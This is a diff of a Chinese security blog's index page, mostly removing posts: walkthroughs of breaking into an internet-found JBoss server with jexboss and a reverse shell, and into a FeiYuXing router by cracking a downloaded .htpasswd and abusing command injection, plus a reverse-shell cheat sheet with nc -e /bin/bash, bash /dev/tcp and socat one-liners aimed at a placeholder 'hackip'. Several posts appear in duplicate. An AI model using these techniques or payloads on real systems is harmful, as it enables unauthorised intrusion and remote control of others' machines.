@@ -245,652 +245,27 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-e5-9c-a8linux-e7-9a-84-ef-bc-88-e6-a0-b9-ef-bc-89-e7-9b-ae-e5-bd-95-e4-b8-8b-e6-89-a7-e8-a1-8crm-rf-e7-9a-84-e6-84-89-e5-bf-ab-e7-bb-8f-e5-8e-86" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99-2/">jboss低版本漏洞拿站</a>
+      <a class="article-title" href="/2017/10/20/e5-9c-a8linux-e7-9a-84-ef-bc-88-e6-a0-b9-ef-bc-89-e7-9b-ae-e5-bd-95-e4-b8-8b-e6-89-a7-e8-a1-8crm-rf-e7-9a-84-e6-84-89-e5-bf-ab-e7-bb-8f-e5-8e-86/">在linux的/（根）目录下执行rm -rf *的愉快经历</a>
     </h1>
   
 
         
-        <a href="/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99-2/" class="archive-article-date">
-  	<time datetime="2019-01-24T09:24:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-24</time>
+        <a href="/2017/10/20/e5-9c-a8linux-e7-9a-84-ef-bc-88-e6-a0-b9-ef-bc-89-e7-9b-ae-e5-bd-95-e4-b8-8b-e6-89-a7-e8-a1-8crm-rf-e7-9a-84-e6-84-89-e5-bf-ab-e7-bb-8f-e5-8e-86/" class="archive-article-date">
+  	<time datetime="2017-10-20T05:18:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-20</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><img src="http://112.74.49.123/wp-content/uploads/2019/01/1.png" alt="在shodan找目标网站-1"> 在shodan找目标网站，我们设定目标为jboss<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/2.png" alt="使用脚本-2"> 打开目标站，确认可以连接<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/3.png" alt="使用脚本-3"> 使用脚本，确认漏洞是否存在<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/4.png" alt="使用脚本-4"> 选择yes，使用exp攻击漏洞<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/5.png" alt="使用脚本-5"> 反弹shell，设置自己的vps开启监听，输入自己的vps的ip和监听port<br><img src="http://112.74.49.123/wp-content/uploads/2019/01/6.png" alt="使用脚本-6"> 接收到shell，并且可正常使用<br>脚本下载方式：<a href="https://github.com/joaomatosf/jexboss" target="_blank" rel="noopener">https://github.com/joaomatosf/jexboss</a> 该脚本依赖于python2<br>使用方式： 1.安装必要的python库 <code>pip install -r requires.txt</code> 2.执行 <code>python jexboss.py -host http://ip:port</code></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Web安全//" class="article-tag-list-link color1">Web安全</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/01/24/jboss-e4-bd-8e-e7-89-88-e6-9c-ac-e6-bc-8f-e6-b4-9e-e6-8b-bf-e7-ab-99-2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/19/linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass-1/">linux下通过脚本自动搭建ss</a>
-    </h1>
-  
-
-        
-        <a href="/2018/12/19/linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass-1/" class="archive-article-date">
-  	<time datetime="2018-12-19T08:32:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><code>wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh</code> <code>chmod +x shadowsocks-all.sh</code> <code>./shadowsocks-all.sh</code> 先是选择ss方式，这里选1，使用python搭建ss服务 然后设置密码(修改为自己想用的密码)， 设置端口(修改为自己想用的端口)， 之后就加密方式等，一路默认就好 然后Press any key to start…这里，随便按一个键(只要不是ctrl+c/ctrl+z等) 一直等待，直到出现enjoy，上边会有ip,端口,密码,加密方式等，就可以用了</p>
-<blockquote>
-<p>关于脚本的启动</p>
-</blockquote>
-<p>启动脚本后面的参数含义，从左至右依次为：启动，停止，重启，查看状态。 Shadowsocks-Python 版： /etc/init.d/shadowsocks-python start | stop | restart | status ShadowsocksR 版： /etc/init.d/shadowsocks-r start | stop | restart | status Shadowsocks-Go 版： /etc/init.d/shadowsocks-go start | stop | restart | status Shadowsocks-libev 版： /etc/init.d/shadowsocks-libev start | stop | restart | status</p>
-<blockquote>
-<p>各版本默认配置文件</p>
-</blockquote>
-<p>Shadowsocks-Python 版： /etc/shadowsocks-python/config.json ShadowsocksR 版： /etc/shadowsocks-r/config.json Shadowsocks-Go 版： /etc/shadowsocks-go/config.json Shadowsocks-libev 版： /etc/shadowsocks-libev/config.json</p>
-<blockquote>
-<p>卸载方法</p>
-</blockquote>
-<p>若已安装多个版本，则卸载时也需多次运行（每次卸载一种） 使用root用户登录，运行以下命令： ./shadowsocks-all.sh uninstall</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/科学上网//" class="article-tag-list-link color5">科学上网</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/19/linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass-1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/19/linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass-2/">linux下通过脚本自动搭建ss</a>
-    </h1>
-  
-
-        
-        <a href="/2018/12/19/linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass-2/" class="archive-article-date">
-  	<time datetime="2018-12-19T08:32:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><code>wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh</code> <code>chmod +x shadowsocks-all.sh</code> <code>./shadowsocks-all.sh</code> 先是选择ss方式，这里选1，使用python搭建ss服务 然后设置密码(修改为自己想用的密码)， 设置端口(修改为自己想用的端口)， 之后就加密方式等，一路默认就好 然后Press any key to start…这里，随便按一个键(只要不是ctrl+c/ctrl+z等) 一直等待，直到出现enjoy，上边会有ip,端口,密码,加密方式等，就可以用了</p>
-<blockquote>
-<p>关于脚本的启动</p>
-</blockquote>
-<p>启动脚本后面的参数含义，从左至右依次为：启动，停止，重启，查看状态。 Shadowsocks-Python 版： /etc/init.d/shadowsocks-python start | stop | restart | status ShadowsocksR 版： /etc/init.d/shadowsocks-r start | stop | restart | status Shadowsocks-Go 版： /etc/init.d/shadowsocks-go start | stop | restart | status Shadowsocks-libev 版： /etc/init.d/shadowsocks-libev start | stop | restart | status</p>
-<blockquote>
-<p>各版本默认配置文件</p>
-</blockquote>
-<p>Shadowsocks-Python 版： /etc/shadowsocks-python/config.json ShadowsocksR 版： /etc/shadowsocks-r/config.json Shadowsocks-Go 版： /etc/shadowsocks-go/config.json Shadowsocks-libev 版： /etc/shadowsocks-libev/config.json</p>
-<blockquote>
-<p>卸载方法</p>
-</blockquote>
-<p>若已安装多个版本，则卸载时也需多次运行（每次卸载一种） 使用root用户登录，运行以下命令： ./shadowsocks-all.sh uninstall</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/科学上网//" class="article-tag-list-link color5">科学上网</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/19/linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass-2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/12/19/linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass/">linux下通过脚本自动搭建ss</a>
-    </h1>
-  
-
-        
-        <a href="/2018/12/19/linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass/" class="archive-article-date">
-  	<time datetime="2018-12-19T08:32:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-19</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><code>wget --no-check-certificate -O shadowsocks-all.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-all.sh</code> <code>chmod +x shadowsocks-all.sh</code> <code>./shadowsocks-all.sh</code> 先是选择ss方式，这里选1，使用python搭建ss服务 然后设置密码(修改为自己想用的密码)， 设置端口(修改为自己想用的端口)， 之后就加密方式等，一路默认就好 然后Press any key to start…这里，随便按一个键(只要不是ctrl+c/ctrl+z等) 一直等待，直到出现enjoy，上边会有ip,端口,密码,加密方式等，就可以用了</p>
-<blockquote>
-<p>关于脚本的启动</p>
-</blockquote>
-<p>启动脚本后面的参数含义，从左至右依次为：启动，停止，重启，查看状态。 Shadowsocks-Python 版： /etc/init.d/shadowsocks-python start | stop | restart | status ShadowsocksR 版： /etc/init.d/shadowsocks-r start | stop | restart | status Shadowsocks-Go 版： /etc/init.d/shadowsocks-go start | stop | restart | status Shadowsocks-libev 版： /etc/init.d/shadowsocks-libev start | stop | restart | status</p>
-<blockquote>
-<p>各版本默认配置文件</p>
-</blockquote>
-<p>Shadowsocks-Python 版： /etc/shadowsocks-python/config.json ShadowsocksR 版： /etc/shadowsocks-r/config.json Shadowsocks-Go 版： /etc/shadowsocks-go/config.json Shadowsocks-libev 版： /etc/shadowsocks-libev/config.json</p>
-<blockquote>
-<p>卸载方法</p>
-</blockquote>
-<p>若已安装多个版本，则卸载时也需多次运行（每次卸载一种） 使用root用户登录，运行以下命令： ./shadowsocks-all.sh uninstall</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/科学上网//" class="article-tag-list-link color5">科学上网</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/12/19/linux-e4-b8-8b-e9-80-9a-e8-bf-87-e8-84-9a-e6-9c-ac-e8-87-aa-e5-8a-a8-e6-90-ad-e5-bb-bass/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/16/e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3/">飞鱼星路由器从命令注入到getshell</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/16/e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3/" class="archive-article-date">
-  	<time datetime="2018-11-16T09:23:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>一个偶然得到一个ip地址，发现8081端口是一个路由器管理界面，叫做飞鱼星。查阅资料知道低版本飞鱼星存在.htpasswd文件，是管理后台登录密码，形如：<a href="http://ip:8081/.htpasswd。" target="_blank" rel="noopener">http://ip:8081/.htpasswd。</a> <img src="http://112.74.49.123/wp-content/uploads/2018/11/1.png" alt=".htpasswd"> 复制.htpasswd，到kali中使用john破解，得到管理后台密码<strong>**</strong>。 <img src="http://112.74.49.123/wp-content/uploads/2018/11/2.png" alt="john破解密码"> 使用admin/<strong>**</strong>登录到管理后台 <img src="http://112.74.49.123/wp-content/uploads/2018/11/3.png" alt=""> <img src="http://112.74.49.123/wp-content/uploads/2018/11/4.png" alt=""> 查看乌云知识库得知飞鱼星存在命令注入漏洞 <img src="http://112.74.49.123/wp-content/uploads/2018/11/7.png" alt="乌云知识库"> 在“系统工具”-&gt;“网络诊断”-&gt;“网络检测”中使用ping检测 <img src="http://112.74.49.123/wp-content/uploads/2018/11/5.png" alt="正常使用"> 命令注入，发现是root用户 <img src="http://112.74.49.123/wp-content/uploads/2018/11/6.png" alt="命令注入"> 通过查看/etc/ssh/sshd_config <img src="http://112.74.49.123/wp-content/uploads/2018/11/8.png" alt="sshd_config"> 发现ssh开在10089端口，并且允许密码登录 通过instruder大牛在github上边发的<a href="https://github.com/instruder/Security/blob/master/research/wifirouter/vul/D-Link/DI-7100(Beat%201022)/%E6%BC%8F%E6%B4%9E/%E7%BD%91%E7%BB%9C%E6%A3%80%E6%B5%8B%E5%8A%9F%E8%83%BD%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/exploit.txt" target="_blank" rel="noopener">exp</a>成功连上ssh 但是进了ssh发现shell是busybox的shell，还需要通过pwn获取路由器shell 放一张没有pwn的ssh <img src="http://112.74.49.123/wp-content/uploads/2018/11/9.png" alt="busybox的ssh"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/网件//" class="article-tag-list-link color3">网件</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/16/e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/16/e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3-2/">飞鱼星路由器从命令注入到getshell</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/16/e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3-2/" class="archive-article-date">
-  	<time datetime="2018-11-16T09:23:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>一个偶然得到一个ip地址，发现8081端口是一个路由器管理界面，叫做飞鱼星。查阅资料知道低版本飞鱼星存在.htpasswd文件，是管理后台登录密码，形如：<a href="http://ip:8081/.htpasswd。" target="_blank" rel="noopener">http://ip:8081/.htpasswd。</a> <img src="http://112.74.49.123/wp-content/uploads/2018/11/1.png" alt=".htpasswd"> 复制.htpasswd，到kali中使用john破解，得到管理后台密码<strong>**</strong>。 <img src="http://112.74.49.123/wp-content/uploads/2018/11/2.png" alt="john破解密码"> 使用admin/<strong>**</strong>登录到管理后台 <img src="http://112.74.49.123/wp-content/uploads/2018/11/3.png" alt=""> <img src="http://112.74.49.123/wp-content/uploads/2018/11/4.png" alt=""> 查看乌云知识库得知飞鱼星存在命令注入漏洞 <img src="http://112.74.49.123/wp-content/uploads/2018/11/7.png" alt="乌云知识库"> 在“系统工具”-&gt;“网络诊断”-&gt;“网络检测”中使用ping检测 <img src="http://112.74.49.123/wp-content/uploads/2018/11/5.png" alt="正常使用"> 命令注入，发现是root用户 <img src="http://112.74.49.123/wp-content/uploads/2018/11/6.png" alt="命令注入"> 通过查看/etc/ssh/sshd_config <img src="http://112.74.49.123/wp-content/uploads/2018/11/8.png" alt="sshd_config"> 发现ssh开在10089端口，并且允许密码登录 通过instruder大牛在github上边发的<a href="https://github.com/instruder/Security/blob/master/research/wifirouter/vul/D-Link/DI-7100(Beat%201022)/%E6%BC%8F%E6%B4%9E/%E7%BD%91%E7%BB%9C%E6%A3%80%E6%B5%8B%E5%8A%9F%E8%83%BD%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/exploit.txt" target="_blank" rel="noopener">exp</a>成功连上ssh 但是进了ssh发现shell是busybox的shell，还需要通过pwn获取路由器shell 放一张没有pwn的ssh <img src="http://112.74.49.123/wp-content/uploads/2018/11/9.png" alt="busybox的ssh"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/网件//" class="article-tag-list-link color3">网件</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/16/e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3-2/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3-1" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/16/e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3-1/">飞鱼星路由器从命令注入到getshell</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/16/e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3-1/" class="archive-article-date">
-  	<time datetime="2018-11-16T09:23:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>一个偶然得到一个ip地址，发现8081端口是一个路由器管理界面，叫做飞鱼星。查阅资料知道低版本飞鱼星存在.htpasswd文件，是管理后台登录密码，形如：<a href="http://ip:8081/.htpasswd。" target="_blank" rel="noopener">http://ip:8081/.htpasswd。</a> <img src="http://112.74.49.123/wp-content/uploads/2018/11/1.png" alt=".htpasswd"> 复制.htpasswd，到kali中使用john破解，得到管理后台密码<strong>**</strong>。 <img src="http://112.74.49.123/wp-content/uploads/2018/11/2.png" alt="john破解密码"> 使用admin/<strong>**</strong>登录到管理后台 <img src="http://112.74.49.123/wp-content/uploads/2018/11/3.png" alt=""> <img src="http://112.74.49.123/wp-content/uploads/2018/11/4.png" alt=""> 查看乌云知识库得知飞鱼星存在命令注入漏洞 <img src="http://112.74.49.123/wp-content/uploads/2018/11/7.png" alt="乌云知识库"> 在“系统工具”-&gt;“网络诊断”-&gt;“网络检测”中使用ping检测 <img src="http://112.74.49.123/wp-content/uploads/2018/11/5.png" alt="正常使用"> 命令注入，发现是root用户 <img src="http://112.74.49.123/wp-content/uploads/2018/11/6.png" alt="命令注入"> 通过查看/etc/ssh/sshd_config <img src="http://112.74.49.123/wp-content/uploads/2018/11/8.png" alt="sshd_config"> 发现ssh开在10089端口，并且允许密码登录 通过instruder大牛在github上边发的<a href="https://github.com/instruder/Security/blob/master/research/wifirouter/vul/D-Link/DI-7100(Beat%201022)/%E6%BC%8F%E6%B4%9E/%E7%BD%91%E7%BB%9C%E6%A3%80%E6%B5%8B%E5%8A%9F%E8%83%BD%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/exploit.txt" target="_blank" rel="noopener">exp</a>成功连上ssh 但是进了ssh发现shell是busybox的shell，还需要通过pwn获取路由器shell 放一张没有pwn的ssh <img src="http://112.74.49.123/wp-content/uploads/2018/11/9.png" alt="busybox的ssh"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/网件//" class="article-tag-list-link color3">网件</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/16/e9-a3-9e-e9-b1-bc-e6-98-9f-e8-b7-af-e7-94-b1-e5-99-a8-e7-a0-b4-e8-a7-a3-1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/11/16/linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95/">linux反弹shell总结(15种方法)</a>
-    </h1>
-  
-
-        
-        <a href="/2018/11/16/linux-e5-8f-8d-e5-bc-b9shell-e6-80-bb-e7-bb-9315-e7-a7-8d-e6-96-b9-e6-b3-95/" class="archive-article-date">
-  	<time datetime="2018-11-16T04:52:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-16</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>1.1发送文件(公网发内网)</p>
-</blockquote>
-<p>文件发送端：nc -lp 6666 &lt; 文件 文件接收端：nc 发送端ip 发送端端口 &gt; 新文件</p>
-<blockquote>
-<p>1.2发送文件(内网发公网)</p>
-</blockquote>
-<p>文件发送端：nc -lp 6666 &gt; 文件 文件接收端：nc 发送端ip 发送端端口 &lt; 新文件</p>
-<blockquote>
-<p>2.聊天</p>
-</blockquote>
-<p>发送端：nc -lp 6666 接收端：nc 发送端ip 发送端端口</p>
-<blockquote>
-<p>3.1发送shell</p>
-</blockquote>
-<p>发送端(公网服务器)：nc -lvvp 6666 -e /bin/bash 2&gt;&amp;1&gt;/dev/null &amp; 接收端：nc 发送端ip 发送端端口</p>
-<blockquote>
-<p>3.2反弹shell</p>
-</blockquote>
-<p>接收端：nc -lvvp 6666 发送端(内网网服务器)：nc 接收端ip 接收端端口 -e /bin/bash 2&gt;&amp;1&gt;/dev/null &amp;</p>
-<blockquote>
-<p>4.bash反弹</p>
-</blockquote>
-<p>接收端(hackip,公网)：nc -lvvp 端口 发送端(受害者)：bash -i &gt;&amp; /dev/tcp/hackip/hack端口 0&gt;&amp;1 发送端(受害者)：0&lt;&amp;31-;exec 31&lt;&gt;/dev/tcp/hackip/hack端口;sh &lt;&amp;31 &gt;&amp;31 2&gt;&amp;31</p>
-<blockquote>
-<p>5.1socat反弹(tcp)</p>
-</blockquote>
-<p>接收端(攻击机)：./socat TCP-LISTEN:端口 - 发送端(靶机)：./socat exec:’bash -i’,pty,stderr,setsid,sigint,sane tcp:攻击机ip:攻击机端口</p>
-<blockquote>
-<p>5.2socat反弹(udp)</p>
-</blockquote>
